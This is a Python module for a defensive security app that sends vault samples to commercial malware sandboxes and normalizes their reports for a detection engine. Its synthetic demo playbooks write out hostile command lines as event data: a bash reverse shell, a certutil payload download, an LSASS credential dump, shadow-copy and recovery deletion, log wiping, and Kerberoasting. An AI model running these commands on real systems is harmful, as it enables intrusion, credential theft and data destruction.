"""Sandbox detonation adapter — push vault samples to a real sandbox.

Roadmap 3.3: samples stored in the vault can be submitted to an external
dynamic-analysis sandbox (Any.Run, Hatching Triage, or Joe Sandbox) and the
resulting report is normalized into the app's unified event schema and pushed
through the *same* detection pipeline as live ingestion — so a sandbox run
produces a normal run: process tree, network connections, alerts, risk score.

**Provider keys are optional** (config.py). With no key configured the webapp
gets a clearly-labeled deterministic *demo* detonation (`demo_events`) — the
honest-fallback pattern from footprint.py, never fake intel presented as real:
the task's `provider` field says `demo`, and the run is a normal analysis run
whose events were generated locally. Configure `ANYRUN_API_KEY` /
`TRIAGE_API_KEY` / `JOE_API_KEY` (+ optional `SANDBOX_PROVIDER`) to switch the
same UI to live detonation.

**Task lifecycle.** `POST /sandbox/detonate` creates a run + a task entry and
returns immediately (`submitted`). The demo path resolves inline (fast);
configured live providers run in a background asyncio task that polls the
provider until the analysis finishes, fetches the report, normalizes it, and
ingests the events. `GET /sandbox/tasks/{id}` returns live status + counts.

The live adapters are thin httpx wrappers over each provider's public REST
API (documented inline). They are best-effort by construction: any provider
failure lands in the task's `error` field instead of bubbling into the API.
The report *normalizers* are pure functions — unit-testable without network.
"""

import asyncio
import datetime
import uuid
from typing import Any

import httpx

from ..core import config
from ..core.db import db_session
from ..models import event as event_store
from ..models import run as run_store
from ..services import detection

# ---------------------------------------------------------------------------
# Provider registry
# ---------------------------------------------------------------------------

# (id, display name, env-key getter, live flag). `demo` is always available.
_PROVIDER_KEYS = ("anyrun", "triage", "joe")


def _key_for(provider: str) -> str:
    if provider == "anyrun":
        return config.ANYRUN_API_KEY
    if provider == "triage":
        return config.TRIAGE_API_KEY
    if provider == "joe":
        return config.JOE_API_KEY
    return ""


def is_configured(provider: str) -> bool:
    return provider in _PROVIDER_KEYS and bool(_key_for(provider))


def active_provider() -> str:
    """The provider to use for `auto`: SANDBOX_PROVIDER if set & configured,
    else the first configured one, else '' (callers fall back to demo)."""
    if config.SANDBOX_PROVIDER in _PROVIDER_KEYS and is_configured(config.SANDBOX_PROVIDER):
        return config.SANDBOX_PROVIDER
    for p in _PROVIDER_KEYS:
        if is_configured(p):
            return p
    return ""


def resolve_provider(want: str) -> str:
    """Map a request's provider string to a concrete provider id."""
    want = (want or "auto").strip().lower()
    if want == "auto":
        return active_provider() or "demo"
    if want == "demo":
        return "demo"
    if want not in _PROVIDER_KEYS:
        raise ValueError(f"Unknown sandbox provider: {want} — expected auto, demo, or one of {', '.join(_PROVIDER_KEYS)}")
    return want


def providers_status() -> list[dict]:
    """The provider list for GET /sandbox/providers — configured flags let the
    UI badge each provider as live vs demo."""
    out = []
    for pid, name in (("anyrun", "Any.Run"), ("triage", "Hatching Triage"), ("joe", "Joe Sandbox")):
        out.append({"id": pid, "name": name, "configured": is_configured(pid)})
    out.append({"id": "demo", "name": "Local demo (no API key)", "configured": True})
    return out


# ---------------------------------------------------------------------------
# Event builders — the normalized event shape the rest of the pipeline expects
# ---------------------------------------------------------------------------

def _ev(run_id: str, platform: str, event_type: str, ts: str, **kw: Any) -> dict:
    ev = {
        "run_id": run_id,
        "platform": platform,
        "event_type": event_type,
        "timestamp": ts,
        "pid": None,
        "ppid": None,
        "process_name": None,
        "command_line": None,
        "dest_ip": None,
        "dest_port": None,
        "protocol": None,
        "file_path": None,
        "registry_key": None,
    }
    ev.update({k: v for k, v in kw.items() if v is not None})
    return ev


def _seq(base: datetime.datetime, index: int, step: int = 3) -> str:
    return (base + datetime.timedelta(seconds=index * step)).isoformat()


# ---------------------------------------------------------------------------
# Report normalizers — pure functions, unit-testable offline
# ---------------------------------------------------------------------------

def _process_rows(report: dict, key: str) -> list[dict]:
    """Tolerant extraction of the process list from any provider shape: a
    plain list, a dict keyed by pid (Triage), or nested under `process`."""
    raw = report.get(key)
    if isinstance(raw, dict) and isinstance(raw.get("process"), list):
        # Nested under `process` — check BEFORE the pid-keyed dict branch,
        # which would otherwise swallow this shape (returning [] from its
        # dict-values filter) and silently drop every process row.
        return [r for r in raw["process"] if isinstance(r, dict)]
    if isinstance(raw, dict):  # Triage: {"1234": {…}, …}
        return [v for v in raw.values() if isinstance(v, dict)]
    if isinstance(raw, list):
        return [r for r in raw if isinstance(r, dict)]
    return []


def _network_rows(report: dict) -> list[dict]:
    """Tolerant extraction of connection rows from nested `network` shapes."""
    net = report.get("network")
    if isinstance(net, dict):
        rows = []
        for k in ("tcp", "udp", "connections"):
            v = net.get(k)
            if isinstance(v, list):
                rows += [r for r in v if isinstance(r, dict)]
        return rows
    if isinstance(net, list):
        return [r for r in net if isinstance(r, dict)]
    return []


def _value_rows(report: dict, key: str) -> list:
    """A provider's files/registry rows: a plain list of dicts or strings."""
    raw = report.get(key)
    return raw if isinstance(raw, list) else []


def _as_ts(value: Any) -> str | None:
    """A sandbox timestamp (ms epoch, ISO, or None) → ISO string, else None."""
    if value is None:
        return None
    if isinstance(value, (int, float)):
        try:
            return datetime.datetime.fromtimestamp(value / 1000, tz=datetime.timezone.utc).isoformat()
        except (OverflowError, OSError, ValueError):
            return None
    if isinstance(value, str):
        return value
    return None


def normalize_anyrun(report: dict, run_id: str, platform: str, base: datetime.datetime) -> list[dict]:
    """Any.Run `report/summary` + `report/network` → normalized events.

    Summary shape: `{"process": [{pid, ppid, processName, commandLine}],
    "files": [{path}], "registry": [{path}]}`; network rows are
    `{protocol, remoteHost, remotePort, processPid}`.
    """
    events: list[dict] = []
    i = 0
    for p in _process_rows(report, "process"):
        events.append(_ev(run_id, platform, "process_create", _seq(base, i),
                          pid=p.get("pid"), ppid=p.get("ppid"),
                          process_name=p.get("processName") or p.get("process_name"),
                          command_line=p.get("commandLine") or p.get("command_line")))
        i += 1
    for c in _network_rows(report):
        ts = _as_ts(c.get("timestamp")) or _seq(base, i)
        events.append(_ev(run_id, platform, "network_connection", ts,
                          pid=c.get("processPid") or c.get("pid"),
                          dest_ip=c.get("remoteHost") or c.get("dst_ip") or c.get("dest_ip"),
                          dest_port=c.get("remotePort") or c.get("dst_port") or c.get("dest_port"),
                          protocol=c.get("protocol") or "TCP"))
        i += 1
    for f in _value_rows(report, "files"):
        path = f.get("path") if isinstance(f, dict) else f
        events.append(_ev(run_id, platform, "file_write", _seq(base, i), pid=f.get("pid") if isinstance(f, dict) else None,
                          file_path=path, process_name=f.get("processName") if isinstance(f, dict) else None))
        i += 1
    for r in _value_rows(report, "registry"):
        key = r.get("path") if isinstance(r, dict) else r
        events.append(_ev(run_id, platform, "registry_write", _seq(base, i),
                          pid=r.get("pid") if isinstance(r, dict) else None,
                          registry_key=key, process_name=r.get("processName") if isinstance(r, dict) else None))
        i += 1
    return events


def normalize_triage(report: dict, run_id: str, platform: str, base: datetime.datetime) -> list[dict]:
    """Triage `reports/{task_id}` → normalized events.

    Shape: `{processes: {pid: {pid, ppid, process_name, command_line}},
    network: {tcp/udp: [{dst_ip, dst_port}]}, files: [{path}],
    registry: [{path}]}`.
    """
    events: list[dict] = []
    i = 0
    for p in _process_rows(report, "processes"):
        events.append(_ev(run_id, platform, "process_create", _seq(base, i),
                          pid=p.get("pid"), ppid=p.get("ppid"),
                          process_name=p.get("process_name") or p.get("processName"),
                          command_line=p.get("command_line") or p.get("commandLine")))
        i += 1
    for c in _network_rows(report):
        events.append(_ev(run_id, platform, "network_connection", _seq(base, i),
                          dest_ip=c.get("dst_ip") or c.get("dest_ip") or c.get("destination_ip"),
                          dest_port=c.get("dst_port") or c.get("dest_port") or c.get("destination_port"),
                          protocol=(c.get("protocol") or "TCP").upper()))
        i += 1
    for f in _value_rows(report, "files"):
        path = f.get("path") if isinstance(f, dict) else f
        events.append(_ev(run_id, platform, "file_write", _seq(base, i), file_path=path))
        i += 1
    for r in _value_rows(report, "registry"):
        key = r.get("path") if isinstance(r, dict) else r
        events.append(_ev(run_id, platform, "registry_write", _seq(base, i), registry_key=key))
        i += 1
    return events


def normalize_joe(report: dict, run_id: str, platform: str, base: datetime.datetime) -> list[dict]:
    """Joe Sandbox `analysis/{webid}/report` → normalized events.

    Shape (under `data`): `{processes: [{name, pid, parent_pid, command_line}],
    network: {tcp/udp: [{dst_ip, dst_port}]}, filesystem: [{path}],
    registry: [{path}]}`.
    """
    doc = report.get("data") if isinstance(report.get("data"), dict) else report
    events: list[dict] = []
    i = 0
    for p in _process_rows(doc, "processes"):
        events.append(_ev(run_id, platform, "process_create", _seq(base, i),
                          pid=p.get("pid"), ppid=p.get("parent_pid") or p.get("ppid"),
                          process_name=p.get("name") or p.get("process_name"),
                          command_line=p.get("command_line") or p.get("commandLine")))
        i += 1
    for c in _network_rows(doc):
        events.append(_ev(run_id, platform, "network_connection", _seq(base, i),
                          dest_ip=c.get("dst_ip") or c.get("dest_ip"),
                          dest_port=c.get("dst_port") or c.get("dest_port"),
                          protocol=(c.get("protocol") or "TCP").upper()))
        i += 1
    for f in _value_rows(doc, "filesystem"):
        path = f.get("path") if isinstance(f, dict) else f
        events.append(_ev(run_id, platform, "file_write", _seq(base, i), file_path=path))
        i += 1
    for r in _value_rows(doc, "registry"):
        key = r.get("path") if isinstance(r, dict) else r
        events.append(_ev(run_id, platform, "registry_write", _seq(base, i), registry_key=key))
        i += 1
    return events


def normalize_report(provider: str, report: dict, run_id: str, platform: str, base: datetime.datetime) -> list[dict]:
    """Dispatch to the provider's normalizer (raises on unknown provider)."""
    if provider == "anyrun":
        return normalize_anyrun(report, run_id, platform, base)
    if provider == "triage":
        return normalize_triage(report, run_id, platform, base)
    if provider == "joe":
        return normalize_joe(report, run_id, platform, base)
    raise ValueError(f"No report normalizer for provider: {provider}")


# ---------------------------------------------------------------------------
# Live adapters — thin httpx wrappers (documented API contracts)
# ---------------------------------------------------------------------------

async def _live_detonate(provider: str, task: dict, sample_bytes: bytes) -> dict:
    """Submit → poll → fetch report for a real provider. Returns the merged
    report dict ready for `normalize_report`. Raises on any failure — the
    task layer catches and records the error."""
    platform = task["platform"]
    key = _key_for(provider)
    if not key:
        raise RuntimeError(f"{provider} is not configured — set the {provider.upper()}_API_KEY env var")
    headers = {"User-Agent": "outpost-sandbox/1.0"}
    async with httpx.AsyncClient(timeout=30.0, headers=headers) as client:
        if provider == "anyrun":
            # POST /v1/analysis — multipart: file + env_os + env_type.
            # Response: {"data": {"id": "<analysis id>"}}.
            resp = await client.post(
                "https://api.any.run/v1/analysis",
                headers={"Authorization": f"Bearer {key}"},
                files={"file": (task["sample_name"], sample_bytes)},
                data={
                    "env_os": platform,
                    "env_type": "complete",
                    "opt_network_connect": "1",
                    "opt_privacy_type": "bylink",
                },
            )
            resp.raise_for_status()
            analysis_id = resp.json().get("data", {}).get("id")
            if not analysis_id:
                raise RuntimeError("Any.Run submit returned no analysis id")
            status_url = f"https://api.any.run/v1/analysis/{analysis_id}"
            report = {}
            for attempt in range(90):  # up to ~30 min
                st = (await client.get(status_url, headers={"Authorization": f"Bearer {key}"})).json()
                state = (st.get("data") or st).get("status", "").lower()
                if state in ("finished", "completed"):
                    break
                if state in ("failed", "error"):
                    raise RuntimeError(f"Any.Run analysis {analysis_id} failed")
                await asyncio.sleep(20)
            else:
                raise RuntimeError("Any.Run analysis timed out (30 min)")
            for part in ("summary", "network", "process", "files", "registry"):
                try:
                    r = await client.get(f"{status_url}/report/{part}", headers={"Authorization": f"Bearer {key}"})
                    r.raise_for_status()
                    data = r.json().get("data", r.json())
                    if isinstance(data, dict):
                        report.update(data)
                except Exception:
                    continue  # a missing report part must not fail the whole run
            return report

        if provider == "triage":
            # POST /v0/samples — multipart: file + _json config.
            # Response: {"id": "<sample id>"}; task id comes from GET /v0/samples/{id}.
            resp = await client.post(
                "https://api.tria.ge/v0/samples",
                headers={"Authorization": f"Bearer {key}"},
                files={"file": (task["sample_name"], sample_bytes)},
                data={"_json": '{"kind": "file", "interactive": false, "defaults": {"timeout": 120, "network": "internet"}}'},
            )
            resp.raise_for_status()
            sample_id = resp.json().get("id")
            if not sample_id:
                raise RuntimeError("Triage submit returned no sample id")
            for attempt in range(90):
                st = (await client.get(f"https://api.tria.ge/v0/samples/{sample_id}", headers={"Authorization": f"Bearer {key}"})).json()
                state = (st.get("status") or "").lower()
                if state in ("reported", "finished"):
                    break
                if state in ("failed", "error"):
                    raise RuntimeError(f"Triage analysis {sample_id} failed")
                await asyncio.sleep(20)
            else:
                raise RuntimeError("Triage analysis timed out (30 min)")
            tasks = (st.get("tasks") or {})
            task_id = next(iter(tasks), None)
            if not task_id:
                raise RuntimeError("Triage sample has no task id")
            r = await client.get(
                f"https://api.tria.ge/v0/samples/{sample_id}/reports/{task_id}",
                headers={"Authorization": f"Bearer {key}"},
            )
            r.raise_for_status()
            return r.json()

        if provider == "joe":
            # POST /v2/analysis/submit — form: apikey, sample, environment.
            # Response: {"data": {"webid": "..."}}.
            env = "linux_ubuntu_lts_x64" if platform == "linux" else "w10_x64"
            resp = await client.post(
                "https://jbxcloud.joesecurity.org/api/v2/analysis/submit",
                data={"apikey": key, "environment": env},
                files={"sample": (task["sample_name"], sample_bytes)},
            )
            resp.raise_for_status()
            webid = resp.json().get("data", {}).get("webid")
            if not webid:
                raise RuntimeError("Joe Sandbox submit returned no webid")
            for attempt in range(90):
                st = (await client.get(f"https://jbxcloud.joesecurity.org/api/v2/analysis/{webid}", params={"apikey": key})).json()
                state = ((st.get("data") or {}).get("status") or "").lower()
                if state in ("finished", "completed"):
                    break
                if state in ("failed", "error"):
                    raise RuntimeError(f"Joe Sandbox analysis {webid} failed")
                await asyncio.sleep(20)
            else:
                raise RuntimeError("Joe Sandbox analysis timed out (30 min)")
            r = await client.get(
                f"https://jbxcloud.joesecurity.org/api/v2/analysis/{webid}/report",
                params={"apikey": key},
            )
            r.raise_for_status()
            return r.json()

    raise RuntimeError(f"Unknown provider: {provider}")


# ---------------------------------------------------------------------------
# Attack Scenario Playbooks & Demo Detonation
# ---------------------------------------------------------------------------

PLAYBOOKS: list[dict[str, Any]] = [
    {
        "id": "ransomware-stager",
        "name": "Ransomware Pre-Encryption & Shadow Eraser",
        "description": "Simulates volume shadow copy deletion (vssadmin), rapid multi-file encryption burst (.locked), ransom note drop, and Run-key persistence.",
        "platform": "windows",
        "severity": "critical",
        "tactics": ["Defense Evasion", "Impact", "Persistence"],
        "techniques": ["T1490", "T1486", "T1547.001"],
    },
    {
        "id": "lolbin-credential-dump",
        "name": "LOLBin & LSASS Credential Dumper",
        "description": "Macro-spawned obfuscated PowerShell stager executing comsvcs.dll mini-dump against LSASS memory and staging credentials.",
        "platform": "windows",
        "severity": "critical",
        "tactics": ["Initial Access", "Execution", "Credential Access"],
        "techniques": ["T1566.001", "T1059.001", "T1003.001"],
    },
    {
        "id": "c2-beacon-exfil",
        "name": "C2 Beaconing & Security Log Eraser",
        "description": "Certutil LOLBin payload download, persistent periodic C2 heartbeats to known malicious IP, and event log wiping (wevtutil).",
        "platform": "windows",
        "severity": "high",
        "tactics": ["Command & Control", "Defense Evasion", "Exfiltration"],
        "techniques": ["T1105", "T1071", "T1070.001"],
    },
    {
        "id": "linux-persistence-rootkit",
        "name": "Linux Cron Persistence & Reverse Shell",
        "description": "Interactive bash reverse socket connection, /etc/cron.d automated task creation, and system auth log tampering.",
        "platform": "linux",
        "severity": "high",
        "tactics": ["Execution", "Persistence", "Defense Evasion"],
        "techniques": ["T1059.004", "T1053.003", "T1070.002"],
    },
    {
        "id": "shadow-copy-delete",
        "name": "Ransomware Shadow Deletion & Recovery Tamper",
        "description": "Adversary executing vssadmin shadow deletion, wbadmin catalog wipe, and bcdedit recovery disablement before encryption.",
        "platform": "windows",
        "severity": "critical",
        "tactics": ["Impact", "Defense Evasion"],
        "techniques": ["T1490", "T1070"],
    },
    {
        "id": "kerberoast-spn-enum",
        "name": "Kerberoasting SPN Discovery & Ticket Extraction",
        "description": "Active Directory SPN enumeration using setspn.exe followed by Kerberos ticket memory extraction via PowerShell.",
        "platform": "windows",
        "severity": "high",
        "tactics": ["Discovery", "Credential Access"],
        "techniques": ["T1087.002", "T1558.003"],
    },
    {
        "id": "scheduled-task-persist",
        "name": "Scheduled Task Persistence & Host Takeover",
        "description": "Creation of SYSTEM-level automated Scheduled Task with logon trigger and registry TaskCache tampering.",
        "platform": "windows",
        "severity": "high",
        "tactics": ["Persistence", "Privilege Escalation"],
        "techniques": ["T1053.005", "T1543"],
    },
]


def list_playbooks() -> list[dict[str, Any]]:
    """List available attack scenario playbooks for live/interactive detonation."""
    return PLAYBOOKS


def demo_events(
    run_id: str,
    platform: str,
    sample_name: str,
    base: datetime.datetime,
    scenario_id: str | None = None,
) -> list[dict]:
    """A deterministic synthetic detonation whose events are exactly the shape
    the detection engine expects — the same rules fire as on a live analysis,
    so the demo pipeline is the real pipeline end to end."""
    # Specific Playbook Scenarios
    if scenario_id == "ransomware-stager" or (not scenario_id and "ransom" in sample_name.lower()):
        return [
            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
                process_name=sample_name, command_line=rf"C:\Users\victim\Downloads\{sample_name}"),
            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
                process_name="vssadmin.exe", command_line=r"vssadmin.exe delete shadows /all /quiet"),
            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1000,
                process_name="powershell.exe", command_line=r"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="),
            *[_ev(run_id, "windows", "file_write", _seq(base, 3 + j), pid=1000,
                  file_path=rf"C:\Users\victim\Documents\database_q{j+1}.mdf.locked") for j in range(6)],
            _ev(run_id, "windows", "file_write", _seq(base, 10), pid=1000,
                file_path=r"C:\Users\victim\Desktop\README_HOW_TO_DECRYPT.txt"),
            _ev(run_id, "windows", "registry_write", _seq(base, 11), pid=1000,
                process_name=sample_name,
                registry_key=r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\LockerService"),
        ]

    if scenario_id == "lolbin-credential-dump" or (not scenario_id and "dump" in sample_name.lower()):
        return [
            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
                process_name="winword.exe", command_line=r'"C:\Program Files\Microsoft Office\winword.exe" invoice.docm'),
            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
                process_name="cmd.exe", command_line=r'cmd.exe /c powershell.exe -EncodedCommand SQBFAFgA...'),
            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1001,
                process_name="rundll32.exe",
                command_line=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full"),
            _ev(run_id, "windows", "network_connection", _seq(base, 3), pid=1001,
                dest_ip="198.51.100.45", dest_port=443, protocol="TCP"),
            _ev(run_id, "windows", "file_write", _seq(base, 4), pid=1002,
                file_path=r"C:\Windows\Temp\lsass.dmp"),
        ]

    if scenario_id == "c2-beacon-exfil":
        return [
            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
                process_name="certutil.exe",
                command_line=r"certutil.exe -urlcache -split -f https://203.0.113.88/stage2.exe C:\Temp\stage2.exe"),
            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
                process_name="stage2.exe", command_line=r"C:\Temp\stage2.exe --listen"),
            _ev(run_id, "windows", "network_connection", _seq(base, 2), pid=1001,
                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
            _ev(run_id, "windows", "network_connection", _seq(base, 3), pid=1001,
                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
            _ev(run_id, "windows", "network_connection", _seq(base, 4), pid=1001,
                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
            _ev(run_id, "windows", "process_create", _seq(base, 5), pid=1002, ppid=1001,
                process_name="wevtutil.exe", command_line=r"wevtutil.exe cl Security"),
            _ev(run_id, "windows", "registry_write", _seq(base, 6), pid=1001,
                registry_key=r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Stage2Updater"),
        ]

    if scenario_id == "shadow-copy-delete":
        return [
            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
                process_name="vssadmin.exe", command_line=r"vssadmin.exe delete shadows /all /quiet"),
            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
                process_name="wbadmin.exe", command_line=r"wbadmin.exe delete catalog -quiet"),
            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1000,
                process_name="bcdedit.exe", command_line=r"bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"),
            _ev(run_id, "windows", "process_create", _seq(base, 3), pid=1003, ppid=1000,
                process_name="bcdedit.exe", command_line=r"bcdedit.exe /set {default} recoveryenabled no"),
            *[_ev(run_id, "windows", "file_write", _seq(base, 4 + j), pid=1000,
                  file_path=rf"C:\Data\finance_q{j+1}.xlsx.enc") for j in range(4)],
        ]

    if scenario_id == "kerberoast-spn-enum":
        return [
            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
                process_name="setspn.exe", command_line=r"setspn.exe -T corp.local -Q MSSQLSvc/*"),
            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
                process_name="powershell.exe",
                command_line=r"powershell.exe -Command Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp.local'"),
            _ev(run_id, "windows", "network_connection", _seq(base, 2), pid=1001,
                dest_ip="10.0.0.1", dest_port=88, protocol="TCP"),
            _ev(run_id, "windows", "file_write", _seq(base, 3), pid=1001,
                file_path=r"C:\Temp\kerberoast_hashes.txt"),
        ]

    if scenario_id == "scheduled-task-persist":
        return [
            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
                process_name="schtasks.exe",
                command_line=r'schtasks.exe /create /tn "SecurityHealthServiceUpdate" /tr "C:\Users\victim\AppData\Local\Temp\updater.exe" /sc onlogon /ru "SYSTEM"'),
            _ev(run_id, "windows", "registry_write", _seq(base, 1), pid=1000,
                registry_key=r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\SecurityHealthServiceUpdate"),
            _ev(run_id, "windows", "file_write", _seq(base, 2), pid=1000,
                file_path=r"C:\Windows\System32\Tasks\SecurityHealthServiceUpdate"),
        ]

    if platform == "linux" or scenario_id == "linux-persistence-rootkit":
        return [
            _ev(run_id, "linux", "process_create", _seq(base, 0), pid=2000, ppid=1,
                process_name="sshd", command_line="sshd: root@pts/2"),
            _ev(run_id, "linux", "process_create", _seq(base, 1), pid=2001, ppid=2000,
                process_name="bash",
                command_line="bash -i >& /dev/tcp/198.51.100.10/4444 0>&1"),
            _ev(run_id, "linux", "network_connection", _seq(base, 2), pid=2001,
                dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
            _ev(run_id, "linux", "network_connection", _seq(base, 3), pid=2001,
                dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
            _ev(run_id, "linux", "network_connection", _seq(base, 4), pid=2001,
                dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
            _ev(run_id, "linux", "network_connection", _seq(base, 5), pid=2000,
                dest_ip="1.1.1.1", dest_port=443, protocol="TCP"),
            *[_ev(run_id, "linux", "file_write", _seq(base, 6 + j), pid=2000,
                  file_path=f"/tmp/staged_{j:03d}.enc") for j in range(5)],
            _ev(run_id, "linux", "file_write", _seq(base, 12), pid=2000,
                file_path="/etc/cron.d/system_updater"),
        ]

    # Default Windows demo
    return [
        _ev(run_id, platform, "process_create", _seq(base, 0), pid=1000, ppid=4,
            process_name=sample_name,
            command_line=rf"C:\Users\victim\AppData\Local\Temp\{sample_name}"),
        _ev(run_id, platform, "process_create", _seq(base, 1), pid=1001, ppid=1000,
            process_name="cmd.exe", command_line=r"C:\Windows\System32\cmd.exe /c whoami"),
        _ev(run_id, platform, "process_create", _seq(base, 2), pid=1002, ppid=1001,
            process_name="powershell.exe", command_line="powershell.exe -enc SQBFAFgAAGgBdAA="),
        _ev(run_id, platform, "network_connection", _seq(base, 3), pid=1002,
            dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
        _ev(run_id, platform, "network_connection", _seq(base, 4), pid=1002,
            dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
        _ev(run_id, platform, "network_connection", _seq(base, 5), pid=1002,
            dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
        _ev(run_id, platform, "network_connection", _seq(base, 6), pid=1000,
            dest_ip="8.8.8.8", dest_port=443, protocol="TCP"),
        *[_ev(run_id, platform, "file_write", _seq(base, 7 + j), pid=1002,
              file_path=rf"C:\Users\victim\Documents\invoice_{j:03d}.enc") for j in range(5)],
        _ev(run_id, platform, "registry_write", _seq(base, 13), pid=1000,
            process_name=sample_name,
            registry_key=r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Updater"),
    ]


# ---------------------------------------------------------------------------
# Task manager
# ---------------------------------------------------------------------------

_tasks: dict[str, dict] = {}


def create_run_id() -> str:
    """A run id in the same 12-hex shape as the ingest routes."""
    return uuid.uuid4().hex[:12]


def get_task(task_id: str) -> dict | None:
    return _tasks.get(task_id)


def create_task(run_id: str, sample_id: str, sample_name: str, provider: str, platform: str) -> dict:
    task_id = uuid.uuid4().hex[:12]
    task = {
        "task_id": task_id,
        "run_id": run_id,
        "sample_id": sample_id,
        "sample_name": sample_name,
        "provider": provider,
        "platform": platform,
        "status": "submitted",
        "events": 0,
        "alerts": 0,
        "risk_score": 0,
        "highest_severity": None,
        "error": None,
        "started_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "finished_at": None,
    }
    _tasks[task_id] = task
    return task


async def run_task(task: dict, sample_bytes: bytes) -> None:
    """Execute one detonation: submit/poll/fetch (live) or generate (demo),
    then ingest the normalized events through the real pipeline."""
    task["status"] = "running"
    base = datetime.datetime.now(datetime.timezone.utc)
    try:
        if task["provider"] == "demo":
            if sample_bytes and task.get("sample_name") != "sandbox-demo.exe" and not (sample_bytes.startswith(b"MZ") and len(sample_bytes) < 100):
                from . import dynamic_sandbox
                events, _, _, _ = await dynamic_sandbox.execute_bytes_sandbox(
                    run_id=task["run_id"],
                    sample_name=task["sample_name"],
                    platform_hint=task["platform"],
                    raw_bytes=sample_bytes,
                )
            else:
                events = demo_events(task["run_id"], task["platform"], task["sample_name"], base)
        else:
            report = await _live_detonate(task["provider"], task, sample_bytes)
            events = normalize_report(task["provider"], report, task["run_id"], task["platform"], base)

        with db_session() as conn:
            row = run_store.get_run(conn, task["run_id"])
            if not row:
                raise RuntimeError(f"Run {task['run_id']} vanished during detonation")
            for ev in events:
                event_store.insert_event(conn, ev)
            new_alerts = detection.evaluate_batch(conn, task["run_id"], events)

            # Live watchlist alerting — watched IOCs in the sandbox report hit
            # the same channel as live ingestion.
            from ..models import watchlist as watchlist_store
            watchlist_matches = watchlist_store.record_hits(
                conn, task["run_id"], watchlist_store.match_events(conn, events)
            )

            run_store.complete_run(conn, task["run_id"])
            summary = run_store.to_summary(conn, run_store.get_run(conn, task["run_id"]))

        # SSE push so open Monitor connections see the sandbox alerts live.
        from ..services import events_stream
        events_stream.publish_alerts(new_alerts)
        if watchlist_matches:
            events_stream.publish_watchlist(
                task["run_id"], task["sample_name"], task["platform"], watchlist_matches
            )

        task.update(
            events=len(events),
            alerts=len(new_alerts),
            risk_score=summary.risk_score,
            highest_severity=summary.highest_severity,
            status="completed",
        )
    except Exception as exc:  # provider outage / bad report — surface, don't crash
        task["status"] = "error"
        task["error"] = str(exc)[:400]
    finally:
        task["finished_at"] = datetime.datetime.now(datetime.timezone.utc).isoformat()


def task_out(task: dict) -> dict:
    """The API-facing shape (drops nothing — the task dict already matches)."""
    return dict(task)
